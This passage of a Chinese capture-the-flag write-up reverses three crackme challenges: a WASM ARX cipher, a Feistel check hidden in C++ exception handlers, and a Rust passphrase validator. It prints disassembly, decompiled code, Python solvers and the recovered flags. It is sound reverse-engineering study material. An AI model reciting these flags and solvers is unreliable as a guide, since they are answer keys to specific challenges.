z = state;
z = (z ^ (z >> 30)) * 0xbf58476d1ce4e5b9;
z = (z ^ (z >> 27)) * 0x94d049bb133111eb;
return z ^ (z >> 31);
```

用种子 `0x36d84b66cd454d90` 连续跑 4 次，得到固定的 4 个 32-bit 密钥：

```txt
0x640e0c07, 0xc64c966a, 0x75b9b11f, 0xbecd29cd
```

它们被存放在 6160 起，供后续 mix 使用。

wasm2c 把 func77 翻译得非常直白：

```c
T  = ((p0 >> 4) ^ (p1 << 3)) + ((p1 >> 6) ^ (p0 << 5));
L  = keys[((p3 & 3) ^ p4)];
res = T ^ ((p2 ^ p1) + (L ^ p0));
```

这是一个典型的 ARX 混合。之前在 WAT 文本里因为栈不平衡看起来很迷惑，但 wasm2c 把求值顺序彻底固定下来，不再有歧义。

w2c_vault_f78 的核心逻辑是：

```c
prev = buf[n-1];               // 初始 prev
for (i = 0; i < n-1; i++) {
    next = buf[i+1];           // 仍然是旧值
    buf[i] = buf[i] + mix(prev, next, key, i, rot, keys);
    prev = buf[i];             // 更新 prev
}
// 最后一位
next = buf[0];                 // 已经是新值
buf[n-1] = buf[n-1] + mix(prev, next, key, n-1, rot, keys);
```

关键点有两个：

1. **更新公式是 new = old + mix(...)**，而不是之前误以为的 mix + prev。
2. 最后一位使用的 next 是已经更新过的 buf[0]（wrap-around）。

外层再套 67 轮，每轮密钥 key += 0x7F4A7C15，rot = (key >> 2) & 3。

因为每一步都是：

```txt
new[i] = old[i] + mix(prev, next, ...)
```

所以可以精确反推：

```txt
old[i] = new[i] - mix(prev, next, ...)
```

逆序恢复顺序如下：

1. 先用最后一步恢复 old[n-1]（此时 prev = new[n-2]，next = new[0] 都已知）。
2. 从 i = n-2 往前到 i = 1，此时 prev = new[i-1] 已知，next = old[i+1] 已经恢复。
3. 最后处理 i = 0（prev = old[n-1]，next = old[1]）。

求解脚本如下：

```py
import struct

MASK32 = 0xFFFFFFFF

def mix(p0, p1, p2, p3, p4, keys):
    t = (((p0 >> 4) ^ ((p1 << 3) & MASK32)) +
         ((p1 >> 6) ^ ((p0 << 5) & MASK32))) & MASK32
    L = keys[((p3 & 3) ^ p4) & 3]
    return (t ^ (((p2 ^ p1) + (L ^ p0)) & MASK32)) & MASK32

KEYS = [0x640e0c07, 0xc64c966a, 0x75b9b11f, 0xbecd29cd]

TARGET = [
    0xBA5588D8, 0xE5C92B0A, 0x3BBDDDB1, 0x84C048D3, 0x00CB89A1,
    0x63FA9E8E, 0x7A415167, 0x075808E7, 0x9F545092, 0xBE6960E3, 0x2178DF63
]

def one_round_forward(buf, key, keys):
    n = len(buf)
    rot = (key >> 2) & 3
    prev = buf[n-1]
    for i in range(n-1):
        nxt = buf[i+1]
        old_i = buf[i]
        m = mix(prev, nxt, key, i, rot, keys)
        buf[i] = (old_i + m) & MASK32
        prev = buf[i]
    nxt = buf[0]
    old_i = buf[n-1]
    m = mix(prev, nxt, key, n-1, rot, keys)
    buf[n-1] = (old_i + m) & MASK32

def inverse_round(after, key, keys):
    n = len(after)
    rot = (key >> 2) & 3
    before = [0] * n

    # 最后一步
    m = mix(after[n-2], after[0], key, n-1, rot, keys)
    before[n-1] = (after[n-1] - m) & MASK32

    # i = n-2 → 1
    for i in range(n-2, 0, -1):
        prev = after[i-1]
        nxt = before[i+1]
        m = mix(prev, nxt, key, i, rot, keys)
        before[i] = (after[i] - m) & MASK32

    # i = 0
    prev = before[n-1]
    nxt = before[1]
    m = mix(prev, nxt, key, 0, rot, keys)
    before[0] = (after[0] - m) & MASK32
    return before

def decrypt():
    buf = TARGET[:]
    keys_seq = []
    k = 0
    for _ in range(67):
        k = (k + 0x7F4A7C15) & MASK32
        keys_seq.append(k)

    for k in reversed(keys_seq):
        buf = inverse_round(buf, k, KEYS)

    data = struct.pack("<11I", *buf)
    flag = data[:42]
    print(flag.decode())

if __name__ == "__main__":
    decrypt()
```

```txt
> python freez_solver.py
flag{5938b5c7-af2f-6d9a-1c3f-d88d5298e832}
```

```txt
flag{5938b5c7-af2f-6d9a-1c3f-d88d5298e832}
```

### 提瓦特委托局·四：向着星辰与1&￥……%！

mainCRTStartup() 跟到 main()。

![](https://img.halfcity.top/2026/11/10/81548a41a6e88a78ac1a3e5778a68506.png)

```txt
Commission complete. Exception handled normally.
```

这里的意思似乎是会触发 SEH 调用 Handler 处理异常吗？

![](https://img.halfcity.top/2026/11/10/2af8c34d7cd4034feb42ec453d9daee5.png)

这个函数已经见过很多次了，是 flag 的提取函数。

```c
_BOOL8 __fastcall sub_14000197E(_PVFV *First, _PVFV *Last, int a3, _QWORD *a4, int a5, int a6)
{
  sub_1400018AF(First: First, Last: Last);
  return memcmp(Buf1: First, Buf2: Last, Size: (size_t)&Size_) == 0;
}

void __fastcall sub_1400018AF(_PVFV *First, _PVFV *Last)
{
  _cxa_allocate_exception(thrown_size: (size_t)First);
  (this: (std::runtime_error *)First)->runtime_error(Last: (const char *)Last);
  _cxa_throw(First: First, lptinfo: (struct type_info *)Last, _ZTISt13runtime_error: `typeinfo for'std::runtime_error);
}
```

`sub_14000197E()` 似乎最后比较了密文与加密后的输入，`sub_1400018AF()` 直接触发了异常。

伪代码视图似乎没有体现对 CPP_EH_EXCEPTION 的处理过程。

这里我尝试直接动态调试找 Handler 但是似乎有点问题，程序没有断下在 Dispatch。

我们直接检查下汇编：

```asm
.text:00000001400018AF                    ; Attributes: bp-based frame fpd=20h
.text:00000001400018AF
.text:00000001400018AF                    ; void __fastcall sub_1400018AF(_PVFV *First, _PVFV *Last)
.text:00000001400018AF                    sub_1400018AF   proc near               ; CODE XREF: sub_14000197E+2E↓p
.text:00000001400018AF                                                            ; DATA XREF: .pdata:00000001400170C0↓o ...
.text:00000001400018AF
.text:00000001400018AF                    var_30          = qword ptr -30h
.text:00000001400018AF                    var_28          = dword ptr -28h
.text:00000001400018AF                    var_24          = dword ptr -24h
.text:00000001400018AF                    arg_0           = qword ptr  10h
.text:00000001400018AF
.text:00000001400018AF                    ; __unwind { // __gxx_personality_seh0
.text:00000001400018AF 000 55                             push    rbp
.text:00000001400018B0 008 57                             push    rdi
.text:00000001400018B1 010 56                             push    rsi
.text:00000001400018B2 018 53                             push    rbx
.text:00000001400018B3 020 48 83 EC 38                    sub     rsp, 38h
.text:00000001400018B7 058 48 8D 6C 24 30                 lea     rbp, [rsp+30h]
.text:00000001400018BC 058 48 89 4D 30                    mov     [rbp+20h+arg_0], rcx
.text:00000001400018C0 058 C7 45 FC 00 00                 mov     [rbp+20h+var_24], 0
.text:00000001400018C0 058 00 00
.text:00000001400018C7 058 EB 38                          jmp     short loc_140001901
.text:00000001400018C9                    ; ---------------------------------------------------------------------------
.text:00000001400018C9
.text:00000001400018C9                    loc_1400018C9:                          ; CODE XREF: sub_1400018AF+56↓j
.text:00000001400018C9 058 B9 10 00 00 00                 mov     ecx, 10h
.text:00000001400018CE 058 E8 A5 01 00 00                 call    __cxa_allocate_exception
.text:00000001400018D3 058 48 89 C3                       mov     rbx, rax
.text:00000001400018D6 058 48 8D 05 BB 27                 lea     rax, aNextWindow ; "next window"
.text:00000001400018D6 058 01 00
.text:00000001400018DD 058 48 89 C2                       mov     rdx, rax
.text:00000001400018E0 058 48 89 D9                       mov     rcx, rbx
.text:00000001400018E3                    ;   try {
.text:00000001400018E3 058 E8 A0 01 00 00                 call    _ZNSt13runtime_errorC1EPKc ; std::runtime_error::runtime_error(char const*)
.text:00000001400018E3                    ;   } // starts at 1400018E3
.text:00000001400018E8 058 4C 8B 05 71 33                 mov     r8, cs:off_140014C60
.text:00000001400018E8 058 01 00
.text:00000001400018EF 058 48 8D 05 5A 35                 lea     rax, _ZTISt13runtime_error ; `typeinfo for'std::runtime_error
.text:00000001400018EF 058 01 00
.text:00000001400018F6 058 48 89 C2                       mov     rdx, rax        ; _ZTISt13runtime_error
.text:00000001400018F9 058 48 89 D9                       mov     rcx, rbx
.text:00000001400018FC                    ;   try {
.text:00000001400018FC 058 E8 57 01 00 00                 call    __cxa_throw
.text:00000001400018FC                    ;   } // starts at 1400018FC
.text:0000000140001901                    ; ---------------------------------------------------------------------------
.text:0000000140001901
.text:0000000140001901                    loc_140001901:                          ; CODE XREF: sub_1400018AF+18↑j
.text:0000000140001901                                                            ; sub_1400018AF+C4↓j
.text:0000000140001901 058 83 7D FC 02                    cmp     [rbp+20h+var_24], 2
.text:0000000140001905 058 7E C2                          jle     short loc_1400018C9
.text:0000000140001907 058 EB 6C                          jmp     short loc_140001975
.text:0000000140001909                    ; ---------------------------------------------------------------------------
.text:0000000140001909                    ;   cleanup() // owned by 1400018E3
.text:0000000140001909 058 48 89 C7                       mov     rdi, rax        ; void *
.text:000000014000190C 058 48 89 D6                       mov     rsi, rdx
.text:000000014000190F 058 48 89 D9                       mov     rcx, rbx
.text:0000000140001912 058 E8 49 01 00 00                 call    __cxa_free_exception
.text:0000000140001917 058 48 89 F8                       mov     rax, rdi
.text:000000014000191A 058 48 89 F2                       mov     rdx, rsi
.text:000000014000191D 058 EB 00                          jmp     short $+2
.text:000000014000191F                    ; ---------------------------------------------------------------------------
.text:000000014000191F
.text:000000014000191F                    loc_14000191F:                          ; CODE XREF: sub_1400018AF+6E↑j
.text:000000014000191F                    ;   catch(std::runtime_error) // owned by 1400018FC
.text:000000014000191F 058 48 83 FA 01                    cmp     rdx, 1
.text:0000000140001923 058 74 08                          jz      short loc_14000192D
.text:0000000140001925 058 48 89 C1                       mov     rcx, rax
.text:0000000140001928 058 E8 B3 17 00 00                 call    _Unwind_Resume
.text:000000014000192D                    ; ---------------------------------------------------------------------------
.text:000000014000192D
.text:000000014000192D                    loc_14000192D:                          ; CODE XREF: sub_1400018AF+74↑j
.text:000000014000192D 058 48 89 C1                       mov     rcx, rax
.text:0000000140001930 058 E8 3B 01 00 00                 call    __cxa_begin_catch
.text:0000000140001935 058 48 89 45 F0                    mov     [rbp+20h+var_30], rax
.text:0000000140001939 058 C7 45 F8 00 00                 mov     [rbp+20h+var_28], 0
.text:0000000140001939 058 00 00
.text:0000000140001940 058 EB 22                          jmp     short loc_140001964
.text:0000000140001942                    ; ---------------------------------------------------------------------------
.text:0000000140001942
.text:0000000140001942                    loc_140001942:                          ; CODE XREF: sub_1400018AF+B9↓j
.text:0000000140001942 058 8B 45 FC                       mov     eax, [rbp+20h+var_24]
.text:0000000140001945 058 8D 14 00                       lea     edx, [rax+rax]
.text:0000000140001948 058 8B 45 F8                       mov     eax, [rbp+20h+var_28]
.text:000000014000194B 058 C1 E0 03                       shl     eax, 3
.text:000000014000194E 058 48 63 C8                       movsxd  rcx, eax
.text:0000000140001951 058 48 8B 45 30                    mov     rax, [rbp+20h+arg_0]
.text:0000000140001955 058 48 01 C8                       add     rax, rcx
.text:0000000140001958 058 48 89 C1                       mov     rcx, rax
.text:000000014000195B 058 E8 A7 FE FF FF                 call    sub_140001807
.text:0000000140001960 058 83 45 F8 01                    add     [rbp+20h+var_28], 1
.text:0000000140001964
.text:0000000140001964                    loc_140001964:                          ; CODE XREF: sub_1400018AF+91↑j
.text:0000000140001964 058 83 7D F8 02                    cmp     [rbp+20h+var_28], 2
.text:0000000140001968 058 7E D8                          jle     short loc_140001942
.text:000000014000196A 058 83 45 FC 01                    add     [rbp+20h+var_24], 1
.text:000000014000196E 058 E8 F5 00 00 00                 call    __cxa_end_catch
.text:0000000140001973 058 EB 8C                          jmp     short loc_140001901
.text:0000000140001975                    ; ---------------------------------------------------------------------------
.text:0000000140001975
.text:0000000140001975                    loc_140001975:                          ; CODE XREF: sub_1400018AF+58↑j
.text:0000000140001975 058 48 83 C4 38                    add     rsp, 38h
.text:0000000140001979 020 5B                             pop     rbx
.text:000000014000197A 018 5E                             pop     rsi
.text:000000014000197B 010 5F                             pop     rdi
.text:000000014000197C 008 5D                             pop     rbp
.text:000000014000197D 000 C3                             retn
.text:000000014000197D                    ; } // starts at 1400018AF
.text:000000014000197D                    sub_1400018AF   endp
```

注意这里：

```asm
.text:000000014000191F                    loc_14000191F:                          ; CODE XREF: sub_1400018AF+6E↑j
.text:000000014000191F                    ;   catch(std::runtime_error) // owned by 1400018FC
.text:000000014000191F 058 48 83 FA 01                    cmp     rdx, 1
.text:0000000140001923 058 74 08                          jz      short loc_14000192D
.text:0000000140001925 058 48 89 C1                       mov     rcx, rax
.text:0000000140001928 058 E8 B3 17 00 00                 call    _Unwind_Resume
```

这里跳转到了 `loc_14000192D` 并执行 `_Unwind_Resume` 从异常恢复。

这里跳转到 `loc_14000192D` 执行 `__cxa_begin_catch` 开始异常处理。随后跳转到 `loc_140001964` 并在里面跳转执行真实的异常处理的逻辑。

![](https://img.halfcity.top/2026/11/10/faafe57f3ee66166b34ab9cca47cfae5.png)

最后调用 `__cxa_end_catch` 结束异常处理。

如果还原成源码的话大致是这个样子：

```cpp
void sub_1400018AF(Window *windows)
{
    for (int i = 0; i <= 2; i++) {
        try {
            throw std::runtime_error("next window");
        }
        catch (std::runtime_error &e) {
            for (int j = 0; j <= 2; j++) {
                sub_140001807(&windows[j], i * 2);
            }
        }
    }
}
```

`sub_140001807` 这个函数就是关键的校验函数了。

伪代码有点问题，这里直接看汇编：

![](https://img.halfcity.top/2026/11/10/a4f0e65b73993d39f26b52c2b287628a.png)

```asm
.text:0000000140001807                    sub_140001807   proc near               ; CODE XREF: sub_1400018AF+AC↓p
.text:0000000140001807                                                            ; DATA XREF: .pdata:00000001400170B4↓o ...
.text:0000000140001807
.text:0000000140001807                    var_24          = qword ptr -24h
.text:0000000140001807                    var_1C          = dword ptr -1Ch
.text:0000000140001807                    var_18          = qword ptr -18h
.text:0000000140001807                    var_C           = dword ptr -0Ch
.text:0000000140001807                    var_8           = qword ptr -8
.text:0000000140001807                    arg_0           = qword ptr  10h
.text:0000000140001807                    arg_8           = dword ptr  18h
.text:0000000140001807
.text:0000000140001807 000 55                             push    rbp
.text:0000000140001808 008 48 89 E5                       mov     rbp, rsp
.text:000000014000180B 008 48 83 EC 50                    sub     rsp, 50h
.text:000000014000180F 058 48 89 4D 10                    mov     [rbp+arg_0], rcx
.text:0000000140001813 058 89 55 18                       mov     [rbp+arg_8], edx
.text:0000000140001816 058 48 8B 45 10                    mov     rax, [rbp+arg_0]
.text:000000014000181A 058 48 89 45 E8                    mov     [rbp+var_18], rax
.text:000000014000181E 058 48 8B 45 E8                    mov     rax, [rbp+var_18]
.text:0000000140001822 058 8B 00                          mov     eax, [rax]
.text:0000000140001824 058 89 45 FC                       mov     dword ptr [rbp+var_8+4], eax
.text:0000000140001827 058 48 8B 45 E8                    mov     rax, [rbp+var_18]
.text:000000014000182B 058 8B 40 04                       mov     eax, [rax+4]
.text:000000014000182E 058 89 45 F8                       mov     dword ptr [rbp+var_8], eax
.text:0000000140001831 058 C7 45 F4 00 00                 mov     [rbp+var_C], 0
.text:0000000140001831 058 00 00
.text:0000000140001838 058 EB 52                          jmp     short loc_14000188C
.text:000000014000183A                    ; ---------------------------------------------------------------------------
.text:000000014000183A
.text:000000014000183A                    loc_14000183A:                          ; CODE XREF: sub_140001807+89↓j
.text:000000014000183A 058 8B 55 18                       mov     edx, [rbp+arg_8]
.text:000000014000183D 058 8B 45 F4                       mov     eax, [rbp+var_C]
.text:0000000140001840 058 01 D0                          add     eax, edx
.text:0000000140001842 058 48 98                          cdqe
.text:0000000140001844 058 48 8D 14 85 00                 lea     rdx, ds:0[rax*4]
.text:0000000140001844 058 00 00 00
.text:000000014000184C 058 48 8D 05 0D 28                 lea     rax, dword_140014060
.text:000000014000184C 058 01 00
.text:0000000140001853 058 8B 04 02                       mov     eax, [rdx+rax]
.text:0000000140001856 058 89 45 E4                       mov     [rbp+var_1C], eax
.text:0000000140001859 058 8B 45 F8                       mov     eax, dword ptr [rbp+var_8]
.text:000000014000185C 058 89 45 E0                       mov     dword ptr [rbp+var_24+4], eax
.text:000000014000185F 058 8B 55 F8                       mov     edx, dword ptr [rbp+var_8]
.text:0000000140001862 058 8B 45 E4                       mov     eax, [rbp+var_1C]
.text:0000000140001865 058 01 D0                          add     eax, edx
.text:0000000140001867 058 BA 05 00 00 00                 mov     edx, 5          ; n5
.text:000000014000186C 058 89 C1                          mov     ecx, eax        ; int
.text:000000014000186E 058 E8 7C FF FF FF                 call    sub_1400017EF
.text:0000000140001873 058 33 45 E4                       xor     eax, [rbp+var_1C]
.text:0000000140001876 058 33 45 FC                       xor     eax, dword ptr [rbp+var_8+4]
.text:0000000140001879 058 89 45 DC                       mov     dword ptr [rbp+var_24], eax
.text:000000014000187C 058 8B 45 E0                       mov     eax, dword ptr [rbp+var_24+4]
.text:000000014000187F 058 89 45 FC                       mov     dword ptr [rbp+var_8+4], eax
.text:0000000140001882 058 8B 45 DC                       mov     eax, dword ptr [rbp+var_24]
.text:0000000140001885 058 89 45 F8                       mov     dword ptr [rbp+var_8], eax
.text:0000000140001888 058 83 45 F4 01                    add     [rbp+var_C], 1
.text:000000014000188C
.text:000000014000188C                    loc_14000188C:                          ; CODE XREF: sub_140001807+31↑j
.text:000000014000188C 058 83 7D F4 01                    cmp     [rbp+var_C], 1
.text:0000000140001890 058 7E A8                          jle     short loc_14000183A
.text:0000000140001892 058 48 8B 45 E8                    mov     rax, [rbp+var_18]
.text:0000000140001896 058 8B 55 FC                       mov     edx, dword ptr [rbp+var_8+4]
.text:0000000140001899 058 89 10                          mov     [rax], edx
.text:000000014000189B 058 48 8B 45 E8                    mov     rax, [rbp+var_18]
.text:000000014000189F 058 48 8D 50 04                    lea     rdx, [rax+4]
.text:00000001400018A3 058 8B 45 F8                       mov     eax, dword ptr [rbp+var_8]
.text:00000001400018A6 058 89 02                          mov     [rdx], eax
.text:00000001400018A8 058 90                             nop
.text:00000001400018A9 058 48 83 C4 50                    add     rsp, 50h
.text:00000001400018AD 008 5D                             pop     rbp
.text:00000001400018AE 000 C3                             retn
.text:00000001400018AE                    sub_140001807   endp
```

![](https://img.halfcity.top/2026/11/10/ffb04b06f8afe8a03a9a201c5d92e65c.png)

大致的语义逻辑如下：

```c
void sub_140001807(uint32_t *p, int key)   // p 指向 8 字节块
{
    uint32_t v0 = p[0];
    uint32_t v1 = p[1];

    for (int i = 0; i <= 1; i++) {
        uint32_t t = table[key + i];                     // table = dword_140014060
        uint32_t tmp = rol32(t + v1, 5) ^ t ^ v0;        // 加法是 32 位模加
        v0 = v1;
        v1 = tmp;
    }

    p[0] = v0;
    p[1] = v1;
}
```

这是一个 2 轮、32 位半块、加法+循环左移+异或的 Feistel 网络。

每轮：

```
(v0, v1) -> (v1, rol32(t + v1, 5) ^ t ^ v0)
```

逆 Feistel，轮序反过来即可解密。

密文我们可以在最后的 cmp 中找到引用：

![](https://img.halfcity.top/2026/11/10/70d59daee4fdf264d75ddc22ed189711.png)

解密脚本如下：

```py
MASK = 0xFFFFFFFF

dword_140014060 = [
    0x13572468, 0xA1B2C3D4, 0x0BADF00D, 0x55AA33CC,
    0x31415926, 0x27182818, 0x00000000, 0x00000000,
]

Size_ = [0x7D, 0xE5, 0x74, 0xDB, 0x26, 0x51, 0xBA, 0xAE, 0x8B, 0x8F, 0x88, 0x99, 0xF2, 0xFC, 0xED, 0x5C, 0xDA, 0x21, 0xE1, 0xB4, 0x0F, 0xA3, 0xFF, 0xF1]

def rol32(x, n):
    x &= MASK
    n &= 31
    return ((x << n) | (x >> (32 - n))) & MASK

# 对每个 8 字节块，按 key = 4, 2, 0 逆序解密
buf = bytearray(Size_)
for off in range(0, len(buf) - 7, 8):
    p0 = int.from_bytes(buf[off:off+4], "little")
    p1 = int.from_bytes(buf[off+4:off+8], "little")
    v0, v1 = p0, p1

    for key in (4, 2, 0):
        # 逆 Feistel：轮序 1,0
        for i in (1, 0):
            t = dword_140014060[key + i] & MASK
            nv1 = v0
            nv0 = (v1 ^ rol32((t + nv1) & MASK, 5) ^ t) & MASK
            v0, v1 = nv0, nv1

    buf[off:off+4] = v0.to_bytes(4, "little")
    buf[off+4:off+8] = v1.to_bytes(4, "little")

flag = bytes(buf)
print("flag{" + flag.decode() + "}")
```

输出如下：

```txt
> python tiwate.py
flag{except10ns_are_the_path!}
```

```txt
flag{except10ns_are_the_path!}
```

### 曼波维修部·三：重写了，但没完全重写

![](https://img.halfcity.top/2026/11/10/fb4374ac1c88d6496421acaafc7d6943.png)

这里可以看到非常多的文件名，rust 程序的特征很明显，标准库里面有大量编译期嵌入的硬编码字符串。

很多都与 panic 处理有关，但是其实把 panic 关了还是会有让人难以理解。

```c
__int64 *__fastcall main(__int64 *a1, char **a2, char **a3)
{
  return sub_16D10(
           sub_17B20: (__int64 (__fastcall *)(int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, __int64, int, int, char, int, int, int, struct _Unwind_Exception *, int, int, int, char, __int64, int))sub_17B20,
           a2: (__int64 *)(int)a1,
           a3: (__int64 *)a2,
           a4: 0);
}
```

进入 main 函数调用 `lang::start()` 进入真正的 main 函数：

![](https://img.halfcity.top/2026/11/10/7e8a4f5cd6aaf90b5201287199353bbe.png)

```c
  v12 = sub_33740(a1: (volatile signed __int32 **)v11, a2: &v10);
  v13 = v2;
  if ( (v12 & 1) != 0 )
  {
    v14[0] = v13;
    sub_54770(a1: (__int64)aCalledResultUn, a2: 43, a3: (__int64)v14, a4: (__int64)&off_58AD8, a5: (__int64)&off_58AC0);// "/mnt/d/ai-community/problem/W4-03/author/challenge.rs"
  }
```

这里的 v12 应该就是 Result，(v12 & 1) != 0取低位也就是 Result 和 Err 取一个枚举值。

这里应该是 `if let Err(e) = challenge::start()` 大致这种逻辑。

当然 rust 的库函数分析起来很麻烦，这个程序也没有符号，只能大致依靠逻辑猜测一下。

![](https://img.halfcity.top/2026/11/10/b01cf904da139e1acd982f95b00039be.png)

这里开头就获取了锁，函数异常的大，可能是一个库函数，这里的开头应该是初始化 string 然后输出，像这样：

```c
__int64 __fastcall sub_17B20()
{
  str *str_0; // rax
  __int64 v1; // rdx
  __int64 v2; // rdx
  __int64 v3; // rax
  __int64 v4; // rdx
  void *v5; // rax
  void *n30; // rdx
  str *str_1; // rax
  __int64 v8; // rdx
  void *v10; // [rsp+70h] [rbp-58h] BYREF
  __int64 v11[3]; // [rsp+88h] [rbp-40h] BYREF
  __int64 v12; // [rsp+A0h] [rbp-28h]
  __int64 v13; // [rsp+A8h] [rbp-20h]
  _QWORD v14[3]; // [rsp+B0h] [rbp-18h] BYREF

  str_0 = (str *)String::new(Rewritten_duty_passphrase:_n: aRewrittenDutyP, n27: 27);
  std::println(str_0, v1);
  sub_17E10(a1: &v10);
  v11[0] = (__int64)sub_40040();
  v12 = sub_33740((volatile signed __int32 **)v11, &v10);
  v13 = v2;
  if ( (v12 & 1) != 0 )
  {
    v14[0] = v13;
    sub_54770((__int64)aCalledResultUn, 43, (__int64)v14, (__int64)&off_58AD8, (__int64)&str_aMntDAiCommunit_23);// "/mnt/d/ai-community/problem/W4-03/author/challenge.rs"
  }
  v3 = sub_193F0(&v10);
  v5 = (void *)sub_17D60(v3, v4);
  if ( (check(a1: v5, n30: n30) & 1) != 0 )
    str_1 = String::new(Rewritten_duty_passphrase:_n: aReviewPassedTe, n27: 56);
  else
    str_1 = String::new(Rewritten_duty_passphrase:_n: aRewriteComplet, n27: 46);
  std::println(str_1, v8);
  return sub_16C20(&v10);
}
```

随后我们可以思考，程序要求输入那么可能就会调用 read_line() 这个函数，而传入给 check 的 v5 应该是原始的输入或者是格式化后的输入。

`if ( (v12 & 1) != 0 )` 这里如果是判断是否读取成功的话 v12 应该就是 read_line() 的 Result 返回值。

后面的 unwrap() 逻辑正好是对 read_line() 的处理，如果 sub_33740 是 read_line() 那么 v11 就是 stdin 了。

后面的 v10 就是 input，那么 v3 就是 stream 那么 v5 就是处理过的函数。

一切就对上了。

恢复如下：

```c
__int64 __fastcall sub_17B20()
{
  str *str_0; // rax
  __int64 v1; // rdx
  __int64 v2; // rdx
  __int64 v3; // rax
  __int64 v4; // rdx
  void *v5; // rax
  void *n30; // rdx
  str *str_1; // rax
  __int64 v8; // rdx
  void *input; // [rsp+70h] [rbp-58h] BYREF
  __int64 stdin[3]; // [rsp+88h] [rbp-40h] BYREF
  __int64 Result_read_line; // [rsp+A0h] [rbp-28h]
  __int64 v13; // [rsp+A8h] [rbp-20h]
  _QWORD v14[3]; // [rsp+B0h] [rbp-18h] BYREF

  str_0 = (str *)String::new(Rewritten_duty_passphrase:_n: aRewrittenDutyP, n27: 27);
  std::println(str: str_0, v1);
  sub_17E10(a1: &input);
  stdin[0] = (__int64)::stdin();
  Result_read_line = io::stdin::read_line((volatile signed __int32 **)stdin, &input);
  v13 = v2;
  if ( (Result_read_line & 1) != 0 )
  {
    v14[0] = v13;
    sub_54770((__int64)aCalledResultUn, 43, (__int64)v14, (__int64)&off_58AD8, (__int64)&str_aMntDAiCommunit_23);// "/mnt/d/ai-community/problem/W4-03/author/challenge.rs"
  }
  v3 = String::to_bytes(&input);
  v5 = (void *)std::trim(v3, v4);
  if ( (check(a1: v5, n30: n30) & 1) != 0 )
    str_1 = (str *)String::new(Rewritten_duty_passphrase:_n: aReviewPassedTe, n27: 56);
  else
    str_1 = (str *)String::new(Rewritten_duty_passphrase:_n: aRewriteComplet, n27: 46);
  std::println(str: str_1, v8);
  return sub_16C20(&input);
}
```

如果我们使用 rust 来写大致如下：

```rust
fn main() {
    println!("Rewritten duty passphrase:");

    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();

    let s = input.trim();

    if challenge::check(s) {
        println!("Review passed. Technical debt successfully transferred.");
    } else {
        println!("Rewrite complete; passphrase problem remains.");
    }
}
```

让我们继续分析 check() 函数吧。

```c
char __fastcall check(void *a1, void *n30)
{
  __int64 v2; // rdx
  unsigned __int64 n0x18_2; // rdx
  __int64 v4; // rdx
  unsigned __int64 n8_1; // rdx
  unsigned __int64 n5; // [rsp+10h] [rbp-198h]
  char v8; // [rsp+1Fh] [rbp-189h]
  unsigned __int64 n0x18; // [rsp+28h] [rbp-180h]
  _QWORD v11[2]; // [rsp+58h] [rbp-150h] BYREF
  _BYTE s[24]; // [rsp+68h] [rbp-140h] BYREF
  _QWORD v13[2]; // [rsp+80h] [rbp-128h] BYREF
  __int64 v14; // [rsp+90h] [rbp-118h]
  unsigned __int64 n0x18_1; // [rsp+98h] [rbp-110h]
  _QWORD dest[24]; // [rsp+A0h] [rbp-108h] BYREF
  _BYTE s_1[8]; // [rsp+160h] [rbp-48h] BYREF
  _QWORD v18[2]; // [rsp+168h] [rbp-40h] BYREF
  __int64 v19; // [rsp+178h] [rbp-30h]
  unsigned __int64 n8; // [rsp+180h] [rbp-28h]
  __int64 v21; // [rsp+188h] [rbp-20h]
  _QWORD v22[3]; // [rsp+190h] [rbp-18h]

  if ( n30 != (char *)&off_18 + 6 )
    return 0;
  v22[2] = 5;
  v22[1] = 1;
  v11[0] = a1;
  v11[1] = 5;
  if ( (sub_18DB0(v11, &off_58890) & 1) != 0 || *((_BYTE *)a1 + 29) != 125 )
    return 0;
  memset(s: s, c: 0, n: sizeof(s));
  v13[0] = sub_188C0(0, n24: 24);
  v13[1] = v2;
  while ( 1 )
  {
    v14 = sub_18DA0(v13);
    n0x18_1 = n0x18_2;
    if ( (v14 & 1) == 0 )
      break;
    n0x18 = n0x18_1;
    memcpy(dest: dest, src: &src_, n: sizeof(dest));
    if ( n0x18 >= 0x18 )
      sub_547FF(n0x18, 24, &str_aMntDAiCommunit_4);// "/mnt/d/ai-community/problem/W4-03/author/challenge.rs"
    n5 = dest[n0x18] + 5LL;
    if ( n5 < 5 )
      sub_55830(&str_aMntDAiCommunit_5);        // "/mnt/d/ai-community/problem/W4-03/author/challenge.rs"
    if ( n5 >= 0x1E )
      sub_547FF(n5, 30, &str_aMntDAiCommunit_6);// "/mnt/d/ai-community/problem/W4-03/author/challenge.rs"
    s[n0x18] = *((_BYTE *)a1 + n5);
  }
  memset(s: s_1, c: 0, n: sizeof(s_1));
  v18[0] = sub_188C0(0, n24: 8);
  v18[1] = v4;
  while ( 1 )
  {
    v19 = sub_18DA0(v18);
    n8 = n8_1;
    if ( (v19 & 1) == 0 )
      break;
    v21 = 0x2179654B74735572LL;
    if ( n8 >= 8 )
      sub_547FF(n8, 8, &str_aMntDAiCommunit_1); // "/mnt/d/ai-community/problem/W4-03/author/challenge.rs"
    v8 = *((_BYTE *)&v22[-1] + n8);
    v22[0] = 0x30626E344D743463LL;
    s_1[n8] = *((_BYTE *)v22 + n8) ^ v8;
  }
  sub_17650(s: s, n24: 24, s: s_1, n8: 8);
  return sub_188B0(s: s, &qword_9BED) & 1;
}
```

`0x2179654B74735572` `0x30626E344D743463` 似乎是 ascii 码的 key。

直接解析就是 `'!yeKtsUr'` `'0bn4Mt4c'` 如果是小端序看的话就是 `'rUstKey!'` `'c4tM4nb0'` 两个词。

将 nxx 这种名字都换成 len 可以看到：

```c
if ( inner_len >= 0x18 )
if ( (sub_18DB0(v11, &off_58890) & 1) != 0 || input[29] != '}' )
```

```asm
.data.rel.ro:0000000000058890 E8 9B 00 00 00…    off_58890       dq offset unk_9BE8      ; DATA XREF: check+84↑o

.rodata:0000000000009BE8 66                 unk_9BE8        db  66h ; f             ; DATA XREF: .data.rel.ro:off_58890↓o
.rodata:0000000000009BE9 6C                                 db  6Ch ; l
.rodata:0000000000009BEA 61                                 db  61h ; a
.rodata:0000000000009BEB 67                                 db  67h ; g
.rodata:0000000000009BEC 7B                                 db  7Bh ; {
```

因此这里来检测了输入的格式，随后从被 src_ 初始化的 dest 中提取 5 到 29 也就是后面的字符。

因此 src_ 应该是一个索引表，我们 dump 出来验证一下，确实如此：

```c
unsigned long src_[24] = {
    0x0000000000000003, 0x000000000000000E, 0x0000000000000001, 0x000000000000000C, 
